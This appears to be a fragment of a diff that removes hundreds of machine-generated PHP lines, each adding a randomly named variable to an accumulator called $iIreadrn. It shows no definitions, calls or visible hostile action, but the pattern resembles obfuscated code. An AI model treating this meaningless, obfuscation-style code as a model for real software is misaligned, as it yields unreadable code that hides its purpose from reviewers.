-$iIreadrn += $aylQFIog;
-$iIreadrn += $QbVdTnXy;
-$iIreadrn += $GEWKrGGh;
-$iIreadrn += $tsppXMjY;
-$iIreadrn += $ZlFxWrpD;
-$iIreadrn += $dYKMCtMg;
-$iIreadrn += $oRzhCKKn;
-$iIreadrn += $VgMukVwc;
-$iIreadrn += $gtZWndoa;
-$iIreadrn += $ATfralij;
-$iIreadrn += $SmRVmVgZ;
-$iIreadrn += $xCPsMHEb;
-$iIreadrn += $CNQiqejr;
-$iIreadrn += $YsqAMVif;
-$iIreadrn += $gxhuJEtW;
-$iIreadrn += $InuFfVkH;
-$iIreadrn += $WZpeklCv;
-$iIreadrn += $KjMKRKTI;
-$iIreadrn += $LgSofniw;
-$iIreadrn += $Ysbcgflv;
-$iIreadrn += $eGyjZQdV;
-$iIreadrn += $EopyHlob;
-$iIreadrn += $tIqeirQs;
-$iIreadrn += $rSDjQjZN;
-$iIreadrn += $aBUGEiUQ;
-$iIreadrn += $OYSSuqvO;
-$iIreadrn += $vaFZSKHu;
-$iIreadrn += $bQpWfZuq;
-$iIreadrn += $ppIQqKuk;
-$iIreadrn += $uvcbFwIR;
-$iIreadrn += $OJkRrezw;
-$iIreadrn += $ZRQKccSm;
-$iIreadrn += $EmxDTXrN;
-$iIreadrn += $VcDiEvQb;
-$iIreadrn += $JdcnlGpk;
-$iIreadrn += $LpDFtLMk;
-$iIreadrn += $UyskhpFh;
-$iIreadrn += $xYkPlhOQ;
-$iIreadrn += $jpqLeswL;
-$iIreadrn += $shSMKiPr;
-$iIreadrn += $rveIJkEC;
-$iIreadrn += $DaaLjstg;
-$iIreadrn += $ahjniQAp;
-$iIreadrn += $cysylgJJ;
-$iIreadrn += $WtsreMGA;
-$iIreadrn += $VQvjOPxr;
-$iIreadrn += $lPnxsSmn;
-$iIreadrn += $eAiaeQhL;
-$iIreadrn += $elYzHmLQ;
-$iIreadrn += $MioftsKw;
-$iIreadrn += $cDrulaws;
-$iIreadrn += $oFRjWarX;
-$iIreadrn += $ZhvihTJl;
-$iIreadrn += $UijcTOGm;
-$iIreadrn += $FXvaKWsh;
-$iIreadrn += $VLFcGSvq;
-$iIreadrn += $rTkXHlLZ;
-$iIreadrn += $chIEEXLQ;
-$iIreadrn += $pKZZNlxH;
-$iIreadrn += $PyWKwmdk;
-$iIreadrn += $gPXKXBxc;
-$iIreadrn += $GGtxnqtp;
-$iIreadrn += $ATKemsYC;
-$iIreadrn += $GLTyrtgI;
-$iIreadrn += $VzWAHmCz;
-$iIreadrn += $dNfwTpZX;
-$iIreadrn += $ZxhdLmcx;
-$iIreadrn += $TtLOLmsm;
-$iIreadrn += $vBiZsuBS;
-$iIreadrn += $mXIBmaWU;
-$iIreadrn += $AFEWVOuG;
-$iIreadrn += $armDBivv;
-$iIreadrn += $EhKNGPYO;
-$iIreadrn += $JfsNNKkS;
-$iIreadrn += $ZzGGaOte;
-$iIreadrn += $CGSHUuzW;
-$iIreadrn += $QaexHIAn;
-$iIreadrn += $kZPCOWcf;
-$iIreadrn += $FRvPcHXD;
-$iIreadrn += $XhPWgtXw;
-$iIreadrn += $dfLzbedE;
-$iIreadrn += $evDOmFTP;
-$iIreadrn += $qPdJLJqf;
-$iIreadrn += $nlmumRTb;
-$iIreadrn += $ZLUFEClG;
-$iIreadrn += $GMrwfExc;
-$iIreadrn += $LwjGhGoz;
-$iIreadrn += $aBifSqeP;
-$iIreadrn += $YFnOQWsN;
-$iIreadrn += $hXfTiXlA;
-$iIreadrn += $cqqiDJBx;
-$iIreadrn += $jhQZbZxr;
-$iIreadrn += $qFJKUzeg;
-$iIreadrn += $RbMtzNpy;
-$iIreadrn += $HpIUGyaD;
-$iIreadrn += $YWpbXxCB;
-$iIreadrn += $bCADlndi;
-$iIreadrn += $xmQGzmGj;
-$iIreadrn += $lhCWVWZb;
-$iIreadrn += $FNrBgZSb;
-$iIreadrn += $DomRHbUN;
-$iIreadrn += $eLXZOOIh;
-$iIreadrn += $ArKgSBqa;
-$iIreadrn += $vyFivQfp;
-$iIreadrn += $kCxuBxCY;
-$iIreadrn += $uzgBXIKY;
-$iIreadrn += $JLgIdAKx;
-$iIreadrn += $qNZwtGkA;
-$iIreadrn += $TSjXccUn;
-$iIreadrn += $zIDqWuhD;
-$iIreadrn += $ICUFMYdL;
-$iIreadrn += $dwsrBerY;
-$iIreadrn += $bYqJjkkQ;
-$iIreadrn += $jQwNCxGk;
-$iIreadrn += $EoFftcYI;
-$iIreadrn += $TbaDTTBf;
-$iIreadrn += $QGEMnNlw;
-$iIreadrn += $BflfhXso;
-$iIreadrn += $PHwcFghP;
-$iIreadrn += $ABXOjtnU;
-$iIreadrn += $DlTmGWcO;
-$iIreadrn += $niGeZSkb;
-$iIreadrn += $paEHeitn;
-$iIreadrn += $aayHZjCZ;
-$iIreadrn += $bSUESfMG;
-$iIreadrn += $pBhJQcjR;
-$iIreadrn += $nTJTkmdK;
-$iIreadrn += $iPATbQIR;
-$iIreadrn += $CeYRVdTZ;
-$iIreadrn += $HeelaQJs;
-$iIreadrn += $KdadPBTP;
-$iIreadrn += $AKuoXzMd;
-$iIreadrn += $zbVymPwh;
-$iIreadrn += $SQvsSNBj;
-$iIreadrn += $QWdSLaDQ;
-$iIreadrn += $MhZaHFAf;
-$iIreadrn += $PPtGyPJf;
-$iIreadrn += $cbZobDoe;
-$iIreadrn += $kpAZkWOU;
-$iIreadrn += $fByPRpwU;
-$iIreadrn += $TPMGEaFE;
-$iIreadrn += $cmdWVwHT;
-$iIreadrn += $mbBPMaet;
-$iIreadrn += $HWdEiqjG;
-$iIreadrn += $KjOeiYAc;
-$iIreadrn += $HNZIoIdw;
-$iIreadrn += $VRVKSPbS;
-$iIreadrn += $QWgnBQAN;
-$iIreadrn += $kDVGZBUk;
-$iIreadrn += $kdhPiQMe;
-$iIreadrn += $aNTgKbhn;
-$iIreadrn += $tjXPzISA;
-$iIreadrn += $kppRDuEm;
-$iIreadrn += $HyXctGpg;
-$iIreadrn += $EjjAaeZz;
-$iIreadrn += $hrlrdLNv;
-$iIreadrn += $SXSBCPPN;
-$iIreadrn += $kIobRcIM;
-$iIreadrn += $rlaWQZVg;
-$iIreadrn += $ySWHcrVt;
-$iIreadrn += $lKPochdw;
-$iIreadrn += $PelPpPem;
-$iIreadrn += $ctkbPiPm;
-$iIreadrn += $EeLaKrwe;
-$iIreadrn += $LNCgfuSh;
-$iIreadrn += $ZoNWTFcs;
-$iIreadrn += $skIDQfxo;
-$iIreadrn += $jkcFfcEC;
-$iIreadrn += $NVGSahjP;
-$iIreadrn += $bmDFobsq;
-$iIreadrn += $EpQFAHNC;
-$iIreadrn += $GhABAgPc;
-$iIreadrn += $POoOqqKA;
-$iIreadrn += $qUfmDkPN;
-$iIreadrn += $WpKzrQda;
-$iIreadrn += $NagHWpDt;
-$iIreadrn += $UOFRDMvH;
-$iIreadrn += $yrtFouCn;
-$iIreadrn += $QPFatjXE;
-$iIreadrn += $tnOwlLwM;
-$iIreadrn += $iPrxEjUu;
-$iIreadrn += $qTSBZzsc;
-$iIreadrn += $LibOcLLt;
-$iIreadrn += $rHANlOrs;
-$iIreadrn += $HJXTgLPU;
-$iIreadrn += $JjlASVAZ;
-$iIreadrn += $TfbvIuqj;
-$iIreadrn += $vqnKVTMu;
-$iIreadrn += $pGqtoEXI;
-$iIreadrn += $TUkLSZcx;
-$iIreadrn += $JsSFxsNp;
-$iIreadrn += $BiuTgZeW;
-$iIreadrn += $pZXDwpci;
-$iIreadrn += $wmHHGqWE;
-$iIreadrn += $kfhGrQPr;
-$iIreadrn += $yxRAcHWn;
-$iIreadrn += $WWZxZazt;
-$iIreadrn += $RTCsIwPN;
-$iIreadrn += $ctHEnzrJ;
-$iIreadrn += $QNnCZQoG;
-$iIreadrn += $eIXFGlVW;
-$iIreadrn += $zViQSwyh;
-$iIreadrn += $YSQsCwhm;
-$iIreadrn += $YTKWVhFS;
-$iIreadrn += $YzMKWfYx;
-$iIreadrn += $dTNJVUJs;
-$iIreadrn += $cDMwTtyE;
-$iIreadrn += $YEdiJmyI;
-$iIreadrn += $ezBNibLQ;
-$iIreadrn += $rCrNJyxC;
-$iIreadrn += $EELwgLVB;
-$iIreadrn += $uwlnOEjJ;
-$iIreadrn += $lpqAFCmu;
-$iIreadrn += $FmjiqxoG;
-$iIreadrn += $iLknQZal;
-$iIreadrn += $mlbusazy;
-$iIreadrn += $PMfqPpIW;
-$iIreadrn += $UMxgLzNv;
-$iIreadrn += $RvhwMZnS;
-$iIreadrn += $cnFYhFBP;
-$iIreadrn += $HkjpxBkb;
-$iIreadrn += $KMgcKugd;
-$iIreadrn += $TpLdxsjE;
-$iIreadrn += $GzROjGiu;
-$iIreadrn += $bMrFbTVF;
-$iIreadrn += $KkwUAtOf;
-$iIreadrn += $AfZvmPRg;
-$iIreadrn += $WiMguixo;
-$iIreadrn += $lTsmAMPK;
-$iIreadrn += $iTPSywtq;
-$iIreadrn += $KZJyUnbj;
-$iIreadrn += $OCTFKHAr;
-$iIreadrn += $wLUwlyhq;
-$iIreadrn += $DcRPVMdA;
-$iIreadrn += $ghEWljaI;
-$iIreadrn += $osMtvLQh;
-$iIreadrn += $exMUUlCe;
-$iIreadrn += $vbZumCMk;
-$iIreadrn += $zcZZtwmm;
-$iIreadrn += $TpJWBwvU;
-$iIreadrn += $ItEjLfHl;
-$iIreadrn += $wBHzFRgu;
-$iIreadrn += $ofkhfKEX;
-$iIreadrn += $yqXaXTyu;
-$iIreadrn += $wPzMwnUv;
-$iIreadrn += $hzBOWtyo;
-$iIreadrn += $mCNqGiKq;
-$iIreadrn += $nRURxXop;
-$iIreadrn += $qtOcZjCp;
-$iIreadrn += $DhrDqAyd;
-$iIreadrn += $QQBTbkLV;
-$iIreadrn += $VUVsZYof;
-$iIreadrn += $JxLtFbJw;
-$iIreadrn += $jJntFPLE;
-$iIreadrn += $AbMhfOHj;
-$iIreadrn += $IsFlKfrT;
-$iIreadrn += $BEghAerk;
-$iIreadrn += $vUykuXFo;
-$iIreadrn += $wUotSYvT;
-$iIreadrn += $gQdYjOog;
-$iIreadrn += $MbpqNbNE;
-$iIreadrn += $BSSbnxhy;
-$iIreadrn += $QjIEujGh;
-$iIreadrn += $BfCfhdyU;
-$iIreadrn += $YpTOGQAl;
-$iIreadrn += $wbbDWFWX;
-$iIreadrn += $xpPKzHhP;
-$iIreadrn += $doLFqsjM;
-$iIreadrn += $DixfAXSw;
-$iIreadrn += $wdXDqrBa;
-$iIreadrn += $xMPMZofr;
-$iIreadrn += $foHuRGWl;
-$iIreadrn += $RhJFEcAJ;
-$iIreadrn += $aAYZdcoE;
-$iIreadrn += $NJsmmbxn;
-$iIreadrn += $WAyysMzr;
-$iIreadrn += $sfGNYYnT;
-$iIreadrn += $kcmHBMnt;
-$iIreadrn += $zuwWmzYR;
-$iIreadrn += $hTMAVNmW;
-$iIreadrn += $jDAIhSja;
-$iIreadrn += $blFNTRwH;
-$iIreadrn += $kwwlCgwa;
-$iIreadrn += $UqOLarGp;
-$iIreadrn += $VEiLUxVT;
-$iIreadrn += $ggBocHnP;
-$iIreadrn += $JdOgwWju;
-$iIreadrn += $sdwNNpjb;
-$iIreadrn += $cPXMuFaL;
-$iIreadrn += $RNkVYqPt;
-$iIreadrn += $kEludlZM;
-$iIreadrn += $KNFXszxu;
-$iIreadrn += $ViQwDJid;
-$iIreadrn += $etwtcTBK;
-$iIreadrn += $kGuUZyeS;
-$iIreadrn += $WEluBoqR;
-$iIreadrn += $SjiZJHFR;
-$iIreadrn += $nsSqdQvi;
-$iIreadrn += $sbnrGeuw;
-$iIreadrn += $RjFNydJb;
-$iIreadrn += $UlZcXRDr;
-$iIreadrn += $ZPcsqRQT;
-$iIreadrn += $bvVCgReJ;
-$iIreadrn += $RhgpgTqT;
-$iIreadrn += $LnKptIHl;
-$iIreadrn += $YwtWxqKu;
-$iIreadrn += $XUBLQYXL;
-$iIreadrn += $uaHhMkYE;
-$iIreadrn += $tkQVPGyX;
-$iIreadrn += $tDCWYXaP;
-$iIreadrn += $LxleZAOk;
-$iIreadrn += $PAzzySaX;
-$iIreadrn += $fLUXYQdt;
-$iIreadrn += $mbOzXvIj;
-$iIreadrn += $NOIXPLzA;
-$iIreadrn += $rYIhDoyY;
-$iIreadrn += $jnyFBHQu;
-$iIreadrn += $FmrIzyvu;
-$iIreadrn += $hvWlCrWl;
-$iIreadrn += $zzmXMtCK;
-$iIreadrn += $pIACnkGD;
-$iIreadrn += $RYuNqiGt;
-$iIreadrn += $OxMMdvBW;
-$iIreadrn += $OJoGaaQB;
-$iIreadrn += $tnGHAOxd;
-$iIreadrn += $CEAjHvOb;
-$iIreadrn += $ExRgEAEi;
-$iIreadrn += $flWHHwiD;
-$iIreadrn += $fGByTZbF;
-$iIreadrn += $ZppdbHIx;
-$iIreadrn += $gdDWqnpU;
-$iIreadrn += $thvBTGRK;
-$iIreadrn += $KeRZvVkT;
-$iIreadrn += $JJLGgspv;
-$iIreadrn += $WazajMds;
-$iIreadrn += $pHUHhvDe;
-$iIreadrn += $IDfPIzPD;
-$iIreadrn += $VDGOLJpF;
-$iIreadrn += $gMUkkjOr;
-$iIreadrn += $KZzJTVtC;
-$iIreadrn += $hPVXLLpH;
-$iIreadrn += $sBFuzKpX;
-$iIreadrn += $JIgiYDma;
-$iIreadrn += $mOMgnzhp;
-$iIreadrn += $AgZuPMrq;
-$iIreadrn += $pFPUeyql;
-$iIreadrn += $fvJctxyz;
-$iIreadrn += $rVitBBen;
-$iIreadrn += $XwuUEKKU;
-$iIreadrn += $bBPUKmqj;
-$iIreadrn += $lBIotMnj;
-$iIreadrn += $gKzpFBno;
-$iIreadrn += $vXaHocGr;
-$iIreadrn += $wozJnRJM;
-$iIreadrn += $JZiLWUit;
-$iIreadrn += $WUQDRefb;
-$iIreadrn += $RgoMSLAf;
-$iIreadrn += $UMjXcGzE;
-$iIreadrn += $kzHEZXsP;
-$iIreadrn += $WESiffMa;
-$iIreadrn += $IrZhMnNq;
-$iIreadrn += $OuJqRWdv;
-$iIreadrn += $wuPmfHFI;
-$iIreadrn += $gfoZpdxA;
-$iIreadrn += $jDSTIMgQ;
-$iIreadrn += $TRadgtKV;
-$iIreadrn += $aIoqKULG;
-$iIreadrn += $JCinkltr;
-$iIreadrn += $lBnyPgpK;
-$iIreadrn += $hrAzQVaU;
-$iIreadrn += $GmbEEtnE;
-$iIreadrn += $GGTgkzFf;
-$iIreadrn += $aXwKWMKB;
-$iIreadrn += $EgtiwrCL;
-$iIreadrn += $dFlOwtMU;
-$iIreadrn += $aNxzJkMH;
-$iIreadrn += $zabnqzha;
-$iIreadrn += $TTYzcBxE;
-$iIreadrn += $pjMSTqtb;
-$iIreadrn += $MDCLCHHz;
-$iIreadrn += $ihPbIyUb;
-$iIreadrn += $JLsVZAWm;
-$iIreadrn += $dMCPzzLP;
-$iIreadrn += $GENldFKf;
-$iIreadrn += $DbTveRDe;
-$iIreadrn += $NtVtZWxZ;
-$iIreadrn += $YzuTesKr;
-$iIreadrn += $OIZWQGoY;
-$iIreadrn += $YylBVgOA;
-$iIreadrn += $cqxtGRiz;
-$iIreadrn += $CRfEMxFA;
-$iIreadrn += $YNwZASqD;
-$iIreadrn += $LRZNMwER;
-$iIreadrn += $oLbLVuMy;
-$iIreadrn += $esLoTjzH;
-$iIreadrn += $Zzowveue;
-$iIreadrn += $siSzQYMV;
-$iIreadrn += $rqskxUyr;
-$iIreadrn += $hEIELNVN;
-$iIreadrn += $krbSEpGP;
-$iIreadrn += $pjfaIVMz;
-$iIreadrn += $kNsEGORO;
-$iIreadrn += $zTvBMdRd;
-$iIreadrn += $qHfLyhGC;
-$iIreadrn += $ZnKbyUqo;
-$iIreadrn += $pqXzgKhx;
-$iIreadrn += $fmxTVdoD;
-$iIreadrn += $nHysBURt;
-$iIreadrn += $GnCwvTtG;
-$iIreadrn += $SzIThIQQ;
-$iIreadrn += $YxawuJdv;
-$iIreadrn += $kFxrhngv;
-$iIreadrn += $BVtJqflt;
-$iIreadrn += $oOlfkYjx;
-$iIreadrn += $GtdMcNcT;
-$iIreadrn += $CKWTvgXF;
-$iIreadrn += $ZpVbjnrG;
-$iIreadrn += $qImoyvBg;
-$iIreadrn += $qOPfHevu;
-$iIreadrn += $TjUAxDIL;
-$iIreadrn += $APxTbeIf;
-$iIreadrn += $PkaVZmiS;
-$iIreadrn += $QmrNEUvs;
-$iIreadrn += $OuWDwYIz;
-$iIreadrn += $eLjreaWH;
-$iIreadrn += $ZNTBJrCs;
-$iIreadrn += $NCdkESpC;
-$iIreadrn += $CRwtabcr;
-$iIreadrn += $wdLqZFXM;
-$iIreadrn += $udQtYoyz;
-$iIreadrn += $ELnkmBea;
-$iIreadrn += $cSkkKaDU;
-$iIreadrn += $UHFhLrnh;
-$iIreadrn += $aeBieXaz;
-$iIreadrn += $LomjhlPA;
-$iIreadrn += $ZaIQJvFe;
-$iIreadrn += $MYJokKgR;
-$iIreadrn += $GppwWiyP;
-$iIreadrn += $UKhQfuYW;
-$iIreadrn += $nuaINZRA;
-$iIreadrn += $XUYFfQRV;
-$iIreadrn += $rJQchfwk;
-$iIreadrn += $DDueVYcD;
-$iIreadrn += $NdAdbVHs;
-$iIreadrn += $sRTiiPqZ;
-$iIreadrn += $oKGwLUJy;
-$iIreadrn += $yaJMQWsv;
-$iIreadrn += $zrEpobId;
-$iIreadrn += $aLgVGYsI;
-$iIreadrn += $llbVnAuX;
-$iIreadrn += $MmVCTrVL;
-$iIreadrn += $jeBLtvmU;
-$iIreadrn += $zNuCeRKC;
-$iIreadrn += $pMuNYEjl;
-$iIreadrn += $TtoYotkr;
-$iIreadrn += $TwqBVwTs;
-$iIreadrn += $rSmGpsVn;
-$iIreadrn += $ooNFwegM;
-$iIreadrn += $kEhKpAoJ;
-$iIreadrn += $hndEyPCq;
-$iIreadrn += $oSPLGnth;
-$iIreadrn += $tdSoNECl;
-$iIreadrn += $uslHjvhF;
-$iIreadrn += $snRmimLh;
-$iIreadrn += $oickSABV;
-$iIreadrn += $yofrbVpj;
-$iIreadrn += $jDzzzTML;
-$iIreadrn += $UHhBVIdo;
-$iIreadrn += $wyJJHvaW;
-$iIreadrn += $XgXYkZSV;
-$iIreadrn += $QYVdqeOG;
-$iIreadrn += $fexhrFcc;
-$iIreadrn += $XJeuDBiY;
-$iIreadrn += $ImOqetXT;
-$iIreadrn += $XtQqigyO;
-$iIreadrn += $GqQPJnRB;
-$iIreadrn += $hdrCNWrP;
-$iIreadrn += $yXshHPKF;
-$iIreadrn += $BgoNKSdN;
-$iIreadrn += $zcufkxTK;
-$iIreadrn += $sGMcibUS;
-$iIreadrn += $jOxkbMaA;
-$iIreadrn += $nHxwlLsy;
-$iIreadrn += $kSKRgEjc;
-$iIreadrn += $UpSWPtQf;
-$iIreadrn += $QdtFmvoF;
-$iIreadrn += $NCdsPkDr;
-$iIreadrn += $vOYwKqrm;
-$iIreadrn += $lnmTeCuE;
-$iIreadrn += $ytYVdCDU;
-$iIreadrn += $wTiBykeE;
-$iIreadrn += $dosAPGXT;
-$iIreadrn += $jrWtPbPC;
-$iIreadrn += $nZEWNwFj;
-$iIreadrn += $EHFFeyPC;
-$iIreadrn += $UYgCWPvn;
-$iIreadrn += $KyVLohiR;
-$iIreadrn += $KWSyBbRw;
-$iIreadrn += $cNQaXKty;
-$iIreadrn += $ObYJaBGg;
-$iIreadrn += $DgIRkiSI;
-$iIreadrn += $rjSOHAlp;
-$iIreadrn += $IFPRodqJ;
-$iIreadrn += $AnbVuMAv;
-$iIreadrn += $UWCkjSyS;
-$iIreadrn += $zJqJCAph;
-$iIreadrn += $vLWIbCJY;
-$iIreadrn += $nkuyFEnX;
-$iIreadrn += $JKBTsvfy;
-$iIreadrn += $ALuDlRMr;
-$iIreadrn += $HdlSCzak;
-$iIreadrn += $mvAHOUTh;
-$iIreadrn += $FEzBTioy;
-$iIreadrn += $vZJzqLcm;
-$iIreadrn += $yttTscet;
-$iIreadrn += $uWmJMSCy;
-$iIreadrn += $byKuQrBn;
-$iIreadrn += $snaNytUA;
-$iIreadrn += $JvcJYcPV;
-$iIreadrn += $kqURMuju;
-$iIreadrn += $sYlvKMix;
-$iIreadrn += $wlwAeKDA;
-$iIreadrn += $mgsgXQyI;
-$iIreadrn += $iqXhPtLh;
-$iIreadrn += $GHilOpjC;
-$iIreadrn += $VAPimgWR;
-$iIreadrn += $DoLnqrzi;
-$iIreadrn += $HTrPICyL;
-$iIreadrn += $BMpfPxUP;
-$iIreadrn += $NUpsGOhu;
-$iIreadrn += $mXUCXMXN;
-$iIreadrn += $pikbxaVh;
-$iIreadrn += $lSblNnzB;
-$iIreadrn += $rxxlJEDS;
-$iIreadrn += $oKMidFbH;
-$iIreadrn += $sxFIAodR;
-$iIreadrn += $wNYcPSHg;
-$iIreadrn += $PmvANQVx;
-$iIreadrn += $gXAKiXnC;
-$iIreadrn += $thMvofce;
-$iIreadrn += $ujqeYkHS;
-$iIreadrn += $wnwmiaSx;
-$iIreadrn += $xCrfKioi;
-$iIreadrn += $RqQkzIBM;
-$iIreadrn += $DgfnUEal;
-$iIreadrn += $SuuvlbeM;
-$iIreadrn += $vAEJIHNV;
-$iIreadrn += $IrcfeZsj;
-$iIreadrn += $QWYXfHkl;
-$iIreadrn += $bSMbrLzA;
-$iIreadrn += $PZYnQnLb;
-$iIreadrn += $VJSYyikr;
-$iIreadrn += $SLMiYfRq;
-$iIreadrn += $ZMbzYwxz;
-$iIreadrn += $KTWVPoWE;
-$iIreadrn += $SNwNYSHk;
-$iIreadrn += $QJTwTOuW;
-$iIreadrn += $UqQPrruJ;
-$iIreadrn += $EehtkcDa;
-$iIreadrn += $cLsAcYDw;
-$iIreadrn += $tfmYPczx;
-$iIreadrn += $FbszATcX;
-$iIreadrn += $KmGXyadL;
-$iIreadrn += $ahWNGOJu;
-$iIreadrn += $cMcMXDCV;
-$iIreadrn += $lhqzuOqH;
-$iIreadrn += $NVHrNxuh;
-$iIreadrn += $xRCkjDar;
-$iIreadrn += $pJfjZGJp;
-$iIreadrn += $rRudHKLs;
-$iIreadrn += $EwERHZcp;
-$iIreadrn += $eVniKSrT;
-$iIreadrn += $dAuiQGLC;
-$iIreadrn += $hwbuOnIg;
-$iIreadrn += $UUrViHdD;
-$iIreadrn += $urDyVOVH;
-$iIreadrn += $AWJZLGpB;
-$iIreadrn += $xCAKrZsA;
-$iIreadrn += $rzGFmmNw;
-$iIreadrn += $juWMvJBE;
-$iIreadrn += $pPDuAsnr;
-$iIreadrn += $yZgmvBam;
-$iIreadrn += $lucmPqwX;
-$iIreadrn += $OgRrPXny;
-$iIreadrn += $RGJCdNAe;
-$iIreadrn += $sMZFMsSs;
-$iIreadrn += $RWTJCurV;
-$iIreadrn += $lnCgzATI;
-$iIreadrn += $QphzQPOm;
-$iIreadrn += $gUYVyxCG;
-$iIreadrn += $eLYVcPqG;
-$iIreadrn += $fekOBaBb;
-$iIreadrn += $jVncUiXD;
-$iIreadrn += $ZbxIGCdr;
-$iIreadrn += $XGKFwiZd;
-$iIreadrn += $BPqdhyPB;
-$iIreadrn += $YfDXqmaI;
-$iIreadrn += $lTtafprr;
-$iIreadrn += $HJmcAMKS;
-$iIreadrn += $cjWPRpqv;
-$iIreadrn += $ZUqFebua;
-$iIreadrn += $mcdnpuri;
-$iIreadrn += $EBCmOvce;
-$iIreadrn += $qMRGouuM;
-$iIreadrn += $gTlbbeji;
-$iIreadrn += $kZITuUet;
-$iIreadrn += $LayIIJbX;
-$iIreadrn += $AkITLjLY;
-$iIreadrn += $XaXiNzIx;
-$iIreadrn += $JqEscWYt;
-$iIreadrn += $sgHXFydR;
-$iIreadrn += $FusWZFyk;
-$iIreadrn += $zmUgjTLW;
-$iIreadrn += $AQRiZNPN;
-$iIreadrn += $KDIWcPkM;
-$iIreadrn += $SpvySymz;
-$iIreadrn += $HZqjbVlU;
-$iIreadrn += $VESsQiDv;
-$iIreadrn += $YfGgvkiq;
-$iIreadrn += $lXkQtTlF;
-$iIreadrn += $FnBTEzaL;
-$iIreadrn += $JJejAeLQ;
-$iIreadrn += $disffkBe;
-$iIreadrn += $zMIogCmh;
-$iIreadrn += $dSoHVfmA;
-$iIreadrn += $bwMakUzM;
-$iIreadrn += $sLLzRmrF;
-$iIreadrn += $GASAhOWR;
-$iIreadrn += $XULboyRf;
-$iIreadrn += $VrQJBuXY;
-$iIreadrn += $xRjupEDW;
-$iIreadrn += $XoiEDNsY;
-$iIreadrn += $VqdlNQTn;
-$iIreadrn += $wlMIcoYF;
-$iIreadrn += $CguICRxo;
-$iIreadrn += $QmRmyYHk;
-$iIreadrn += $VQFNCCbc;
-$iIreadrn += $sjxomraO;
-$iIreadrn += $qjoYyNQQ;
-$iIreadrn += $ZrqvBnuH;
-$iIreadrn += $QvaviJuU;
-$iIreadrn += $ZeMIlSuG;
-$iIreadrn += $myMniPLb;
-$iIreadrn += $CAbKVNDT;
-$iIreadrn += $dcnRCjaR;
-$iIreadrn += $GgQnjKka;
-$iIreadrn += $ETCtuJzH;
-$iIreadrn += $odMckPIF;
-$iIreadrn += $rqnbTBvR;
-$iIreadrn += $kPRONHCp;
-$iIreadrn += $TUlAfuEL;
-$iIreadrn += $SJCyoxFS;
-$iIreadrn += $vmvpQpxX;
-$iIreadrn += $GJzRfTlB;
-$iIreadrn += $jHewAoUL;
-$iIreadrn += $bXyUqoyK;
-$iIreadrn += $CspPSsXY;
-$iIreadrn += $SmFFAkPN;
-$iIreadrn += $zOoVEVxI;
-$iIreadrn += $nerpJhpH;
-$iIreadrn += $FLfAiWzC;
-$iIreadrn += $AeqUtpan;
-$iIreadrn += $UxqASLOJ;
-$iIreadrn += $KtsQZqXr;
-$iIreadrn += $ZYLFkIEv;
-$iIreadrn += $zjaxHeDe;
-$iIreadrn += $EWFlGvWv;
-$iIreadrn += $YJCNXMbD;
-$iIreadrn += $jFoftstP;
-$iIreadrn += $DLbOOWiH;
-$iIreadrn += $defgrFli;
-$iIreadrn += $mhqLdWjj;
-$iIreadrn += $ZEUtHjhi;
-$iIreadrn += $QPhixUSU;
-$iIreadrn += $JPQLkptC;
-$iIreadrn += $sMfAxcLg;
-$iIreadrn += $VzxlAFtS;
-$iIreadrn += $nncmzCst;
-$iIreadrn += $iOsfiKLW;
-$iIreadrn += $fTQDFnlp;
-$iIreadrn += $IHUuvFJA;
-$iIreadrn += $qpWfHmmn;
-$iIreadrn += $NiYDsKvj;
-$iIreadrn += $dJLiafvg;
-$iIreadrn += $jbijSyfO;
-$iIreadrn += $DIKiKEWT;
-$iIreadrn += $MGuAgsPY;
-$iIreadrn += $osMNNBuH;
-$iIreadrn += $adbEQBrM;
-$iIreadrn += $dGkyywNi;
-$iIreadrn += $islULwxe;
-$iIreadrn += $sbQIZxPk;
-$iIreadrn += $WkfVjUzv;
-$iIreadrn += $yTveGEkr;
-$iIreadrn += $tdupdDJm;
-$iIreadrn += $WhPqXgCW;
-$iIreadrn += $fiQQetdh;
-$iIreadrn += $dXwIPuHn;
-$iIreadrn += $QUgwGAtm;
-$iIreadrn += $ZWoDAdib;
-$iIreadrn += $rZoiFkHm;
-$iIreadrn += $PExanluU;
-$iIreadrn += $KEpBftPf;
-$iIreadrn += $MmFNoSSf;
-$iIreadrn += $rrbYYxVI;
-$iIreadrn += $rhCUhtOG;
-$iIreadrn += $dBuUZCUv;
-$iIreadrn += $XGgRbznG;
-$iIreadrn += $ajNHbrQb;
-$iIreadrn += $OzeMVQOB;
-$iIreadrn += $kiMHQYwW;
-$iIreadrn += $UDOeReVY;
-$iIreadrn += $bKMGtYmf;
-$iIreadrn += $DmXvGZmf;
-$iIreadrn += $uAvtBXpM;
-$iIreadrn += $EnFVlceE;
-$iIreadrn += $VUqTpfsB;
-$iIreadrn += $BxrlXXJm;
-$iIreadrn += $leEHwkKN;
-$iIreadrn += $VDCqVkjp;
-$iIreadrn += $gwdjAtiP;
-$iIreadrn += $myfAjLhS;
-$iIreadrn += $EjyNfsEM;
-$iIreadrn += $DwhQNyzj;
-$iIreadrn += $NBvMjWsb;
-$iIreadrn += $aGkgicdS;
-$iIreadrn += $ccwtAhAE;
-$iIreadrn += $jSzWoahS;
-$iIreadrn += $YnVVdPZB;
-$iIreadrn += $UflZThUe;
-$iIreadrn += $IcqyfxEE;
-$iIreadrn += $SNirswWs;
-$iIreadrn += $HtBPgYle;
-$iIreadrn += $UgJZGxgA;
-$iIreadrn += $VYBqcbBA;
-$iIreadrn += $TPCayLmb;
-$iIreadrn += $ynenBBIN;
-$iIreadrn += $ilHgceAB;
-$iIreadrn += $cHGMNJnV;
-$iIreadrn += $tFVXBZte;
-$iIreadrn += $tyazfQkg;
-$iIreadrn += $NiQwauFw;
-$iIreadrn += $HoxsElyM;
-$iIreadrn += $GZjpCIHV;
-$iIreadrn += $zQRlCoXT;
-$iIreadrn += $MoGpwEqQ;
-$iIreadrn += $WZYrabSB;
-$iIreadrn += $OeasVjPY;
-$iIreadrn += $eqbZgUIp;
-$iIreadrn += $RiLmMRav;
-$iIreadrn += $jtkzDavF;
-$iIreadrn += $KFXtYDlW;
-$iIreadrn += $yDdvzaqb;
-$iIreadrn += $nHPFhIDW;
-$iIreadrn += $pUagykre;
-$iIreadrn += $bOBlgooH;
-$iIreadrn += $XHXdAxIr;
-$iIreadrn += $RoWRVBwN;
-$iIreadrn += $tIvyKxUI;
-$iIreadrn += $BNLjiDDr;
-$iIreadrn += $eRyeLwIv;
-$iIreadrn += $anlwwIBq;
-$iIreadrn += $PgRuzhFU;
-$iIreadrn += $ItUdatZD;
-$iIreadrn += $EVJFbRDw;
-$iIreadrn += $nelmDgYD;
